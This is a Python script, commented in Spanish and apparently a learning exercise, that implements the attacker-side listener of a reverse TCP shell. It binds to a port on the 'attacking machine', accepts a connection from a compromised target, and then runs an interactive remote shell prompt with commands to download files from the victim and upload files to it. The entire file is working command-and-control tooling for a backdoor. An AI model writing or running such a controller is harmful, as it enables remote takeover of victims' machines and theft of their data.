# Servidor para reverse TCP. Se configura un puerto de escucha para el payload
import socket
import json
import os


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

    
def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication():
    while True:
        command = input('* Shell~%s: ' %str(ip)).lower()
        reliable_send(command)

        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

# AF_INET = IP     SOCK_STREAM = TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# IP de la máquina atacante
sock.bind(('192.168.1.136', 5555))

print('[+] Esperando conexión entrante')
sock.listen(5)

# La función accept() de socket devuelve una pareja de valores, conexión y dirección. Conexión es un socket nuevo que se puede utiliar para enviar y recibir datos. Al asignar la pareja de variables a la función, cada variable contiene cada uno de los objetos retornados
target, ip = sock.accept()

print ('[+] Objetivo conectado desde: ' + str(ip))

target_communication()
